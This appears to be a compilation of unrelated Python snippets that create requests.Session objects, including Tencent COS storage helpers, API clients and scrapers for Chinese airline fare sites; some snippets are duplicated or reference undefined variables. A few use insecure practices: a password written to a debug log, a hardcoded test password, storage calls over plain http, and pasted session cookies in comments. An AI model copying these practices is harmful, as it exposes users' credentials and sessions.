    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2

# 解析数据 
**************************************
def get_object(self, name, is_private=False):
        method = 'get'
        appid = self.option['Appid']
        SecretID = self.option['SecretID']
        SecretKey = self.option['SecretKey']
        region = self.option['region']
        bucket = self.option['bucket']
        if name[0] != '/':
            name = '/' + name
        objectName = name
        url = "http://%s-%s.%s.myqcloud.com%s" % (bucket, appid, region, objectName)
        s = requests.Session()
        if is_private:
            auth = Auth(appid, SecretID, SecretKey, bucket, region, method, objectName)
            Authorization = {'Authorization': auth.get_authorization()}
            s.headers.update(Authorization)

        r = s.get(url)
        return r 
**************************************
def put_object(self, name, content):
        method = 'put'
        appid = self.option['Appid']
        SecretID = self.option['SecretID']
        SecretKey = self.option['SecretKey']
        region = self.option['region']
        bucket = self.option['bucket']
        if name[0] != '/':
            name = '/' + name
        objectName = name
        url = "http://%s-%s.%s.myqcloud.com%s" % (bucket, appid, region, objectName)

        s = requests.Session()
        auth = Auth(appid, SecretID, SecretKey, bucket, region, method, objectName)
        Authorization = {'Authorization': auth.get_authorization()}
        s.headers.update(Authorization)

        r = s.put(url, data=content)
        if r.status_code == 200:
            return r
        else:
            LOGGER.info(r.content) 
**************************************
def head_object(self, name, is_private=False):
        method = 'head'
        appid = self.option['Appid']
        SecretID = self.option['SecretID']
        SecretKey = self.option['SecretKey']
        region = self.option['region']
        bucket = self.option['bucket']
        if name[0] != '/':
            name = '/' + name
        objectName = name
        url = "http://%s-%s.%s.myqcloud.com%s" % (bucket, appid, region, objectName)
        s = requests.Session()
        if is_private:
            auth = Auth(appid, SecretID, SecretKey, bucket, region, method, objectName)
            Authorization = {'Authorization': auth.get_authorization()}
            s.headers.update(Authorization)

        r = s.head(url)
        return r 
**************************************
def delete_object(self, name):
        method = 'delete'
        appid = self.option['Appid']
        SecretID = self.option['SecretID']
        SecretKey = self.option['SecretKey']
        region = self.option['region']
        bucket = self.option['bucket']
        if name[0] != '/':
            name = '/' + name
        objectName = name
        url = "http://%s-%s.%s.myqcloud.com%s" % (bucket, appid, region, objectName)

        s = requests.Session()
        auth = Auth(appid, SecretID, SecretKey, bucket, region, method, objectName)
        Authorization = {'Authorization': auth.get_authorization()}
        s.headers.update(Authorization)

        r = s.delete(url)
        if r.status_code == 204:
            return True 
**************************************
def _init_session(self):
        """_init_session() is a private method to perfom command
        session initializaton actions.
        As this creates a session without a logged in user, only
        public profile content is available, until a login is
        performed on this session.
        """

        s = self._session = requests.Session()

        s.headers['Accept-charset'] = "utf-8"

        if self._format == "json":
            pass
        elif self._format == 'xmlfm':
            s.headers['Accept'] = "application/xml"
            s.headers['Accept'] = "text/xml"
        else:
            raise ValueError("Invalid format: " + repr(self._format)) 
**************************************
def setup_connector(app, name='default', **options):
	if not hasattr(app, 'extensions'):
		app.extensions = {}

	if 'connectors' not in app.extensions:
		app.extensions['connectors'] = {}
	session = Session()

	if 'auth' in options:
		session.auth = options['auth']
	headers = options.get('headers', {})

	if 'Content-Type' not in headers:
		headers['Content-Type'] = 'application/json'
	session.headers.update(headers)

	app.extensions['connectors'][name] = session
	return session 
**************************************
def setup_connector(app, name='default', **options):
	if not hasattr(app, 'extensions'):
		app.extensions = {}

	if 'connectors' not in app.extensions:
		app.extensions['connectors'] = {}
	session = Session()

	if 'auth' in options:
		session.auth = options['auth']
	headers = options.get('headers', {})

	if 'Content-Type' not in headers:
		headers['Content-Type'] = 'application/json'
	session.headers.update(headers)

	app.extensions['connectors'][name] = session
	return session 
**************************************
def paging(endpoint, request_json) -> tuple:
    """Split input list into pages"""
    result_pages = {}
    session = requests.Session()
    success = True
    while True:
        r_json = utils.vmaas_post_request(endpoint, request_json, session)
        if r_json is None:
            LOGGER.info("Downloading ERROR.")
            success = False
            break
        response_to_list = [(k, v) for k, v in r_json.items()]
        data_index = response_to_list[0][0]
        data = response_to_list[0][1]
        result_pages.setdefault(data_index, {}).update(data)
        LOGGER.info("Downloading CVE/REPOs metadata (page: %s, page_size: %s, pages: %s)",
                    request_json['page'], r_json["page_size"], r_json['pages'])
        if request_json['page'] >= r_json['pages']:
            break
        request_json['page'] += 1
    session.close()

    if success:
        result_pages.update({"page": r_json["page"], "page_size": r_json["page_size"], "pages": r_json["pages"]})
    return (success, result_pages) 
**************************************
def __init__(self):
        """init"""
        self.session = requests.Session()
        self.eln_session_id = None
        self.headers = { 
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36'
                        ' (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        } 
**************************************
def __init__(self, base_url, apikey):
        # The URL in the config should end in /MAAS/, but the api is behind /MAAS/api/2.0/
        self.base_url = base_url + "/api/2.0/"
        self.apikey = apikey

        self.signer = MaasOauth(apikey)
        self.http_session = requests.Session()

        # TODO(sh8121att) Get logger name from config
        self.logger = logging.getLogger('drydock') 
**************************************
def __init__(self,
                 host,
                 port=None,
                 scheme='http',
                 auth_gen=None,
                 marker=None,
                 end_user=None,
                 timeout=None):
        self.logger = logging.getLogger(__name__)
        self.__session = requests.Session()
        self.auth_gen = auth_gen

        self.set_auth()

        self.marker = marker
        self.end_user = end_user
        self.__session.headers.update({'X-Context-Marker': marker})

        if end_user:
            self.__session.headers.update({'X-End-User': end_user})

        self.host = host
        self.scheme = scheme

        if port:
            self.port = port
            self.base_url = "%s://%s:%s/api/" % (self.scheme, self.host,
                                                 self.port)
        else:
            # assume default port for scheme
            self.base_url = "%s://%s/api/" % (self.scheme, self.host)

        self.default_timeout = self._calc_timeout_tuple((20, 30), timeout) 
**************************************
def get_ks_session(**kwargs):
        # Establishes a keystone session
        if 'token' in kwargs:
            auth = v3.TokenMethod(token=kwargs.get('token'))
        else:
            auth = v3.Password(**kwargs)
        return session.Session(auth=auth) 
**************************************
def __init__(self, url, user, password):
        """
            Create a session with the server.
            :param user: User name
            :param password: Password
            :except: Raises RuntimeError if server replies with an error code.
        """
        self.url = url
        self.session = Session()
        self._login(user, password) 
**************************************
def requests_retry_session(
    retries=3,
    backoff_factor=5,
    session=None,
):
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    #session.mount('https://', adapter)
    return session

########### Declare Type of station: AWS,ARG or AGRO ########
#station = 'aws' 
**************************************
def do_network_work(args) -> None:
        network_resource, *_ = args
        Session = network_resource
        with Session() as s:
            adapter = HTTPAdapter(max_retries=3)
            s.mount('http://', adapter)
            s.get('http://localhost:8080/') 
**************************************
def get_session(domain):
    """
    获取一个此域名的 keep-alive 的session
    :param domain: 域名
    :type domain: str
    :rtype: requests.Session
    """
    if domain not in pool:
        pool[domain] = []

    if not hasattr(locked_session, "session"):
        # 这个变量用于存储本线程中被锁定的session
        # 当一个session被拿出来使用时, 会从 pool 中被移除, 加入到下面这个变量中
        # 当线程结束后, 需要调用 release_lock() 来释放被锁定的session
        #    此时被锁定的session会重新进入session池
        locked_session.session = []

    if not pool[domain]:
        # 线程池空, 新建一个 session
        session = {
            "domain": domain,
            "session": requests.Session(),
        }
    else:
        # 从线程池中取出最近的一个
        session = pool[domain].pop()

    session["active"] = time()

    locked_session.session.append(session)

    return session["session"] 
**************************************
def __init__(self, logger, user_name, password):
        this_func_name = sys._getframe().f_code.co_name

        self.logger = logger
        self.user_name = user_name
        self.password = password

        session = requests.Session()
        session.headers = {
                'User-Agent': random.choice(pc_browser_ua)
                }
        self.session = session

        self.logger.debug("%s(): user_name: %s\tpassword: %s" % (this_func_name, user_name, password))
        self.logger.debug("%s(): start ..." % this_func_name) 
**************************************
def __init__(self, host, username, password, ssl, verify_ssl=True):
        self.host = host
        self.session = requests.Session()
        self.session.auth = (username, password)
        self.ssl = ssl
        self.verify_ssl = verify_ssl 
**************************************
def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(
            {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; \
             Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'}) 
**************************************
def __init__(self, cookiejar=None):
        # Initialise the session
        self._s = requests.Session()
        self._user_cached = None
        self.logged_in = False

        if cookiejar:
            self._s.cookies = cookiejar

            # Check if the given cookies log the user in
            user = self.user()
            if user:
                self.logged_in = True 
**************************************
def refresh_login(self):
        """Deletes persisted cookies which forces a login attempt with current credentials"""

        s = requests.Session()
        empty_cookie_jar = s.cookies
        if util.save_data(addon, self.COOKIE_FILE_NAME, empty_cookie_jar):
            xbmcgui.Dialog().ok(addonname, "Cleared cookies. Please exit the addon and open it again.")
        else:
            xbmcgui.Dialog().ok(addonname, "Could not refresh lynda session cookies") 
**************************************
def __init__(
        self, url: str, auth: Auth = None, verify: Verify = True
    ) -> None:
        self.url = url
        self.session = requests.Session()
        if auth is not None:
            self.session.auth = auth
        self.session.verify = verify 
**************************************
def list_sessions(self) -> List[Session]:
        """List all the active sessions in Livy."""
        data = self._client.get("/sessions")
        return [Session.from_json(item) for item in data["sessions"]] 
**************************************
def get_session(self, session_id: int) -> Optional[Session]:
        """Get information about a session.

        :param session_id: The ID of the session.
        """
        try:
            data = self._client.get(f"/sessions/{session_id}")
        except requests.HTTPError as e:
            if e.response.status_code == 404:
                return None
            else:
                raise
        return Session.from_json(data) 
**************************************
def change_params_and_get_the_session():
    global params, datas, login_url, post_url, s, dl_session
    tag = 'Change_Params_And_Get_The_Session'
    print_with_tag(tag, 'Changing Request params..')
    datas['pixiv_id'] = pixiv_user_name
    datas['password'] = pixiv_user_pass
    print_with_tag(tag, 'Post data params changed.')
    s = requests.Session()
    s.headers = params
    # dl_session = requests.Session()
    print_with_tag(tag, 'Session started.') 
**************************************
def run_job(id):
    s = requests.Session()

    r = s.post("http://127.0.0.1:5000/api/v1/auth/",
               data={"email": "[email protected]", "password": "123456", "method": "login"})

    s.get("http://127.0.0.1:5000/test_run/auto/%s" % id) 
**************************************
def check_version():
    f = codecs.open('version.txt', 'r')
    version = f.readline()
    s = requests.Session()
    r_version = s.get("https://gitee.com/lym51/AutoLine/raw/master/version.txt").text
    if version != r_version:
        print("*" * 25)
        print("本地版本：v%s" % version)
        print("github版本: v%s" % r_version)
        print("AutoLine开源平台代码已有更新，请到下面的地址更新代码:")
        print("https://github.com/small99/AutoLine")
        print("*" * 25)
        exit(0)
    f.close() 
**************************************
def get_chaohua_list(cookie, sinceId):
    url = "https://m.weibo.cn/api/container/getIndex?containerid=100803_-_page_my_follow_super"
    if sinceId != '':
        url = url + "&since_id=%s" % sinceId
    headers = {
        'Cookie': cookie
    }
    session = requests.Session()
    response = session.get(url, headers=headers)
    response = response.json()
    return response 
**************************************
def data_Crawling(from_h,to_h,date_h):
    s = requests.Session()
    start_url = 'http://b2c.csair.com/B2C40/modules/bookingnew/main/flightSelectDirect.html?t=S&c1='+from_h+'&c2='+to_h+'&d1='+date_h+'&at=1&ct=0&it=0&preUrl=360BUY'
    h2 = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Encoding':'gzip, deflate, sdch',
          'Accept-Language':'zh-CN,zh;q=0.8',
          'X-Requested-With':'XMLHttpRequest',
          #Cookie:Webtrends=111.160.254.58.1464136223732083; BIGipServerpool_sc_122.119.122.51=830109562.20480.0000; JSESSIONID=0000M2suWXhIhzAP_5BzKDkE78S:1a5jgnqlj; OZ_1U_671=vid=v744f3c10a3ea8.0&ctime=1464140663&ltime=1464140662; OZ_1Y_671=erefer=-&eurl=http%3A//sc.travelsky.com/scet/queryAv.do%3Flan%3Dcn%26countrytype%3D0%26travelType%3D0%26cityNameOrg%3D%25E5%258C%2597%25E4%25BA%25AC%26cityCodeOrg%3DPEK%26cityNameDes%3D%25E5%258E%25A6%25E9%2597%25A8%26cityCodeDes%3DXMN%26takeoffDate%3D2016-05-28%26returnDate%3D2016-05-28%26cabinStage%3D0%26adultNum%3D1%26childNum%3D0&etime=1464139715&ctime=1464140663&ltime=1464140662&compid=671
          'Referer':start_url,
          'Origin':'http://b2c.csair.com',
          'Host':'b2c.csair.com',
          'Proxy-Connection':'keep-alive',
          'Upgrade-Insecure-Requests':1,
          'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36'
          }
    date_h = date_h.replace('-','')
    data = '{"depcity":"'+from_h+'", "arrcity":"'+to_h+'", "flightdate":"'+date_h+'", "adultnum":"1", "childnum":"0", "infantnum":"0", "cabinorder":"0","airline":"1", "flytype":"0", "international":"0", "action":"0", "segtype":"1", "cache":"0", "preUrl":"360BUY", "isMember":""}'
    data = urllib.quote(data)
    res_url ='http://b2c.csair.com/B2C40/query/jaxb/direct/query.ao?json='+data
    try:
        re =s.get(start_url,headers = h1,timeout = 15)
        resp1 = s.post(res_url,headers = h2,timeout = 15)
        return resp1.text,resp1.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
    except AttributeError:
        #print resp.text
        return -1,-1
# 解析数据 
**************************************
def data_Crawling(from_h,to_h,date_h):
    s = requests.Session()
    start_url = 'http://b2c.csair.com/B2C40/modules/bookingnew/main/flightSelectDirect.html?t=S&c1='+from_h+'&c2='+to_h+'&d1='+date_h+'&at=1&ct=0&it=0&preUrl=360BUY'
    h2 = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Encoding':'gzip, deflate, sdch',
          'Accept-Language':'zh-CN,zh;q=0.8',
          'X-Requested-With':'XMLHttpRequest',
          #Cookie:Webtrends=111.160.254.58.1464136223732083; BIGipServerpool_sc_122.119.122.51=830109562.20480.0000; JSESSIONID=0000M2suWXhIhzAP_5BzKDkE78S:1a5jgnqlj; OZ_1U_671=vid=v744f3c10a3ea8.0&ctime=1464140663&ltime=1464140662; OZ_1Y_671=erefer=-&eurl=http%3A//sc.travelsky.com/scet/queryAv.do%3Flan%3Dcn%26countrytype%3D0%26travelType%3D0%26cityNameOrg%3D%25E5%258C%2597%25E4%25BA%25AC%26cityCodeOrg%3DPEK%26cityNameDes%3D%25E5%258E%25A6%25E9%2597%25A8%26cityCodeDes%3DXMN%26takeoffDate%3D2016-05-28%26returnDate%3D2016-05-28%26cabinStage%3D0%26adultNum%3D1%26childNum%3D0&etime=1464139715&ctime=1464140663&ltime=1464140662&compid=671
          'Referer':start_url,
          'Origin':'http://b2c.csair.com',
          'Host':'b2c.csair.com',
          'Proxy-Connection':'keep-alive',
          'Upgrade-Insecure-Requests':1,
          'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36'
          }
    date_h = date_h.replace('-','')
    data = '{"depcity":"'+from_h+'", "arrcity":"'+to_h+'", "flightdate":"'+date_h+'", "adultnum":"1", "childnum":"0", "infantnum":"0", "cabinorder":"0","airline":"1", "flytype":"0", "international":"0", "action":"0", "segtype":"1", "cache":"0", "preUrl":"360BUY", "isMember":""}'
    data = urllib.quote(data)
    res_url ='http://b2c.csair.com/B2C40/query/jaxb/direct/query.ao?json='+data
    try:
        re =s.get(start_url,headers = h1,timeout = 15)
        resp1 = s.post(res_url,headers = h2,timeout = 15)
        return resp1.text,resp1.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
    except AttributeError:
        #print resp.text
        return -1,-1
# 解析数据 
**************************************
def data_Crawling(from_h,to_h,date_h,SC):
    s = requests.Session()
    try:
        resp1 = s.get('http://new.hnair.com/hainanair/ibe/deeplink/ancillary.do?DD1='+date_h+'&DD2=&TA=1&TC=0&TI=&ORI='+from_h+'&DES='+to_h+'&SC='+SC+'&ICS=F&PT=F&PT=&FLC=1&NOR=&PACK=T',headers=h1,timeout=15)

        resp2 = s.post('http://new.hnair.com/hainanair/ibe/deeplink/ancillary.do?DD1='+date_h+'&DD2=&TA=1&TC=0&TI=&ORI='+from_h+'&DES='+to_h+'&SC='+SC+'&ICS=F&PT=F&PT=&FLC=1&NOR=&PACK=T&redirected=true',headers=h2,timeout=15)

        resp3 = s.get('http://new.hnair.com/hainanair/ibe/deeplink/entryPointRedirect.do?QUERY=ancillaryIBESearch',headers=h3,timeout=15)

        #resp4 = s.post('http://new.hnair.com/hainanair/ibe/deeplink/entryPointRedirect.do?redirected=true')

        resp5 = s.get('http://new.hnair.com/hainanair/ibe/common/processSearchEntry.do?fromEntryPoint=true',headers=h5,timeout=15)

        resp6 = s.get('http://new.hnair.com/hainanair/ibe/common/spinner.do',headers=h6,timeout=15)

        #respwait = s.get('http://www.hnair.com/qt/dkggpic/wait/')

        resp7 = s.post('http://new.hnair.com/hainanair/ibe/common/processSearch.do',headers=h7,timeout=15)

        resp8 = s.get('http://new.hnair.com/hainanair/ibe/air/processSearch.do',headers=h8,timeout=15)

        resp = s.get('http://new.hnair.com/hainanair/ibe/air/searchResults.do',headers=h9,timeout=15)
        return resp.text,resp.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
# 解析数据 
**************************************
def data_Crawling(from_h,to_h,date_h):
    s = requests.Session()
    try:
        #resp1 = s.post('http://sc.travelsky.com/scet/queryAv.do?lan=cn&countrytype=0&travelType=0&cityNameOrg=%E5%8C%97%E4%BA%AC&cityCodeOrg=PEK&cityNameDes=%E5%8E%A6%E9%97%A8&cityCodeDes=XMN&takeoffDate=2016-05-28&returnDate=2016-05-28&cabinStage=0&adultNum=1&childNum=0',headers=h1,timeout=15)
        url = 'http://sc.travelsky.com/scet/queryAv.do?lan=cn&countrytype=0&travelType=0&cityNameOrg=&cityCodeOrg='+from_h+'&cityNameDes=&cityCodeDes='+to_h+'&takeoffDate='+date_h+'&returnDate=&cabinStage=0&adultNum=1&childNum=0'
        resp1 = s.post(url,headers = h1,timeout=15)
        h2 = {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding':'gzip, deflate',
                'Accept-Language':'zh-CN,zh;q=0.8',
                'Cache-Control':'max-age=0',
                #'Content-Length':234
                'Content-Type':'application/x-www-form-urlencoded',
               # Cookie:Webtrends=111.160.254.58.1464136223732083; BIGipServerpool_sc_122.119.122.51=830109562.20480.0000; JSESSIONID=0000M2suWXhIhzAP_5BzKDkE78S:1a5jgnqlj; OZ_1U_671=vid=v744f3c10a3ea8.0&ctime=1464140688&ltime=1464140663; OZ_1Y_671=erefer=-&eurl=http%3A//sc.travelsky.com/scet/queryAv.do%3Flan%3Dcn%26countrytype%3D0%26travelType%3D0%26cityNameOrg%3D%25E5%258C%2597%25E4%25BA%25AC%26cityCodeOrg%3DPEK%26cityNameDes%3D%25E5%258E%25A6%25E9%2597%25A8%26cityCodeDes%3DXMN%26takeoffDate%3D2016-05-28%26returnDate%3D2016-05-28%26cabinStage%3D0%26adultNum%3D1%26childNum%3D0&etime=1464139715&ctime=1464140688&ltime=1464140663&compid=671
                'Host':'sc.travelsky.com',
                'Origin':'http://sc.travelsky.com',
                'Proxy-Connection':'keep-alive',
                'Referer':url,
                'Upgrade-Insecure-Requests':1,
                'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36'
        }
        id = re.search(r'<input type="hidden" name ="airAvailId" value="(.*?)" />',resp1.text)
        resp= s.post('http://sc.travelsky.com/scet/airAvail.do?airAvailId='+id.group(1)+'&cityCodeOrg='+from_h+'&cityCodeDes='+to_h+'&cityNameOrg=&cityNameDes=&takeoffDate='+date_h+'&returnDate=&travelType=0&countrytype=0&needRT=0&cabinStage=0&adultNum=1&childNum=0',headers = h2,timeout=15)
        return resp.text,resp.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
# 解析数据 
**************************************
def data_Crawling(from_h,to_h,date_h):
    s = requests.Session()
    try:
        #resp1 = s.post('http://sc.travelsky.com/scet/queryAv.do?lan=cn&countrytype=0&travelType=0&cityNameOrg=%E5%8C%97%E4%BA%AC&cityCodeOrg=PEK&cityNameDes=%E5%8E%A6%E9%97%A8&cityCodeDes=XMN&takeoffDate=2016-05-28&returnDate=2016-05-28&cabinStage=0&adultNum=1&childNum=0',headers=h1,timeout=15)
        url = 'http://sc.travelsky.com/scet/queryAv.do?lan=cn&countrytype=0&travelType=0&cityNameOrg=&cityCodeOrg='+from_h+'&cityNameDes=&cityCodeDes='+to_h+'&takeoffDate='+date_h+'&returnDate=&cabinStage=0&adultNum=1&childNum=0'
        resp1 = s.post(url,headers = h1,timeout=15)
        h2 = {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding':'gzip, deflate',
                'Accept-Language':'zh-CN,zh;q=0.8',
                'Cache-Control':'max-age=0',
                #'Content-Length':234
                'Content-Type':'application/x-www-form-urlencoded',
               # Cookie:Webtrends=111.160.254.58.1464136223732083; BIGipServerpool_sc_122.119.122.51=830109562.20480.0000; JSESSIONID=0000M2suWXhIhzAP_5BzKDkE78S:1a5jgnqlj; OZ_1U_671=vid=v744f3c10a3ea8.0&ctime=1464140688&ltime=1464140663; OZ_1Y_671=erefer=-&eurl=http%3A//sc.travelsky.com/scet/queryAv.do%3Flan%3Dcn%26countrytype%3D0%26travelType%3D0%26cityNameOrg%3D%25E5%258C%2597%25E4%25BA%25AC%26cityCodeOrg%3DPEK%26cityNameDes%3D%25E5%258E%25A6%25E9%2597%25A8%26cityCodeDes%3DXMN%26takeoffDate%3D2016-05-28%26returnDate%3D2016-05-28%26cabinStage%3D0%26adultNum%3D1%26childNum%3D0&etime=1464139715&ctime=1464140688&ltime=1464140663&compid=671
                'Host':'sc.travelsky.com',
                'Origin':'http://sc.travelsky.com',
                'Proxy-Connection':'keep-alive',
                'Referer':url,
                'Upgrade-Insecure-Requests':1,
                'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36'
        }
        id = re.search(r'<input type="hidden" name ="airAvailId" value="(.*?)" />',resp1.text)
        time.sleep(2)
        resp= s.post('http://sc.travelsky.com/scet/airAvail.do?airAvailId='+id.group(1)+'&cityCodeOrg='+from_h+'&cityCodeDes='+to_h+'&cityNameOrg=&cityNameDes=&takeoffDate='+date_h+'&returnDate=&travelType=0&countrytype=0&needRT=0&cabinStage=0&adultNum=1&childNum=0',headers = h2,timeout=15)
        return resp.text,resp.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
    except AttributeError:
        #print resp.text
        return -1,-1
# 解析数据 
**************************************
def data_Crawling(from_h,to_h,date_h,i_orgcity, i_dstCity):
    s = requests.Session()
    data = '{"AirlineType":"Single","IsFixedCabin":false,"RouteList":[{"RouteIndex":1,"RouteName":"单    程","OrgCity":"'+from_h+'","DesCity":"'+to_h+'","OrgCityName":"'+i_orgcity+'","DesCityName":"'+i_dstCity+'","FlightDate":"'+date_h+'"}],"AVType":0}'
    #data = urllib.urlencode(data)
    data = urllib.quote(data)
    data = 'http://www.scal.com.cn/Web/ETicket/AirlineList?AirlineParamJSON='+data
    try:
        resp = s.post(data,timeout=15)
        url = re.search(r'arrPageValue.AirlineParamJSON = (.*?);',resp.text)
        #print url.group(1)
        data = json.loads( url.group(1))
        #print(data)
        data1 = re.search(r'arrPageValue.AirlineParamJSON = .*\[(.*?)\].*;',resp.text).group(1).replace("}","")
        #data1 = str(data['RouteList'][0]).replace("}","")
        data11 = data['AirlineType']
        data1 += ',\"AirlineType\":\"'+data11+'\"'
        data11 = data['AVType']
        data1 += ',\"AVType\":'+str(data11)
        data1 += ',\"CardFlag\":null'
        data11 = data['Flag']
        data1 += ',\"Flag\":null'
        data11 = data['BuyerType']
        data1 += ',\"BuyerType\":'+str(data11)
        data11 = data['IsFixedCabin']
        data1 += ',\"IsFixedCabin\":'+str(data11).lower()
        data11 = data['PassKey']
        data1 += ',\"PassKey\":\"'+data11+'\"}'
        data1 = json.loads(data1)
        resp1 = s.post('http://www.scal.com.cn/Web/ETicket/GetSingleChina',json=data1)
        return resp1.text,resp1.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
    except AttributeError:
        #print resp.text
        return -1,-1
# 解析数据 
**************************************
def data_Crawling(from_h,to_h,date_h,i_orgcity, i_dstCity):
    s = requests.Session()
    data = '{"AirlineType":"Single","IsFixedCabin":false,"RouteList":[{"RouteIndex":1,"RouteName":"单    程","OrgCity":"'+from_h+'","DesCity":"'+to_h+'","OrgCityName":"'+i_orgcity+'","DesCityName":"'+i_dstCity+'","FlightDate":"'+date_h+'"}],"AVType":0}'
    #data = urllib.urlencode(data)
    data = urllib.quote(data)
    data = 'http://www.scal.com.cn/Web/ETicket/AirlineList?AirlineParamJSON='+data
    try:
        resp = s.post(data,timeout=15)
        url = re.search(r'arrPageValue.AirlineParamJSON = (.*?);',resp.text)
        #print url.group(1)
        data = json.loads( url.group(1))
        #print(data)
        data1 = re.search(r'arrPageValue.AirlineParamJSON = .*\[(.*?)\].*;',resp.text).group(1).replace("}","")
        #data1 = str(data['RouteList'][0]).replace("}","")
        data11 = data['AirlineType']
        data1 += ',\"AirlineType\":\"'+data11+'\"'
        data11 = data['AVType']
        data1 += ',\"AVType\":'+str(data11)
        data1 += ',\"CardFlag\":null'
        data11 = data['Flag']
        data1 += ',\"Flag\":null'
        data11 = data['BuyerType']
        data1 += ',\"BuyerType\":'+str(data11)
        data11 = data['IsFixedCabin']
        data1 += ',\"IsFixedCabin\":'+str(data11).lower()
        data11 = data['PassKey']
        data1 += ',\"PassKey\":\"'+data11+'\"}'
        data1 = json.loads(data1)
        resp1 = s.post('http://www.scal.com.cn/Web/ETicket/GetSingleChina',json=data1)
        return resp1.text,resp1.status_code
    except requests.exceptions.ReadTimeout:
        return -1,-1
    except requests.exceptions.ConnectionError:
        return -2,-2
    except AttributeError:
        #print resp.text
        return -1,-1
# 解析数据 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def _set_user_agent(clc):
        if hasattr(clc, 'SetRequestsSession'):
            agent_string = "ClcAnsibleModule/" + __version__
            ses = requests.Session()
            ses.headers.update({"Api-Client": agent_string})
            ses.headers['User-Agent'] += " " + agent_string
            clc.SetRequestsSession(ses) 
**************************************
def __init__(
        self,
        proxy=None,
        session=None,
        timeout=80,
        verify_ssl=True,
        **kwargs
    ):
        # type: (str, str, str or dict, _requests.Session, int, bool) -> HTTPClient
        self._proxy = None
        self._session = session
        self._timeout = timeout
        self._verify_ssl = verify_ssl
        self._kwargs = _copy.deepcopy(kwargs)

        if proxy:

            if isinstance(proxy, str):
                proxy = { "http": proxy, "https": proxy }

            if not isinstance(proxy, dict):
                raise ValueError(
                    """
                    The `proxy` parameter must either be `None`, a string
                    representing the URL of a proxy for both HTTP + HTTPS,
                    or a dictionary with a different URL for `"http"` and
                    `"https"`.
                    """
                )

            self._proxy = _copy.deepcopy(proxy)

        # NOTE: This make HTTPClient and any class containing it as an attribute
        # impossible to pickle. Implemented custom pickling to avoid this.
        self._local_thread = _threading.local() 
**************************************
def _get_session(self):
        # type: None -> _threading.local
        """
        Return or establish the session associated with the current thread.
        """
        # Make sure the local thread storage has been instantiated
